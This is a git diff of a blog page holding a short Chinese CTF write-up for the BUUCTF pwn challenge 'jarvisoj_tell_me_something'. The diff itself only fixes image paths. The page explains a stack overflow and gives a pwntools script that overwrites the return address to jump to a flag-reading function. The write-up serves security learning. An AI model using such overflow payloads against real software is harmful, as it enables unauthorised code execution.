@@ -36,11 +36,11 @@
 <main>
 <h1 id="buuctf-pwn-jarvisoj_tell_me_something">BUUCTF Pwn Jarvisoj_tell_me_something</h1>
 <p>考点：栈溢出</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409203446244.png" alt="image-20200409203446244"></p>
+<p><img src="/images/image-20200409203446244.png" alt="image-20200409203446244"></p>
 <p>64位程序，开启nx</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409201854306.png" alt="image-20200409201854306"></p>
+<p><img src="/images/image-20200409201854306.png" alt="image-20200409201854306"></p>
 <p>存在一个函数读flag</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409201923037.png" alt="image-20200409201923037"></p>
+<p><img src="/images/image-20200409201923037.png" alt="image-20200409201923037"></p>
 <p>栈溢出到good_game()来读flag</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 <span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
@@ -53,7 +53,7 @@ flag_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400
 payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>offset <span style="color:#f92672">+</span> p64(flag_addr)
 sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">message:</span><span style="color:#e6db74">&#34;</span>,payload)
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409202344428.png" alt="image-20200409202344428"></p>
+</code></pre></div><p><img src="/images/image-20200409202344428.png" alt="image-20200409202344428"></p>
 
 </main>
 
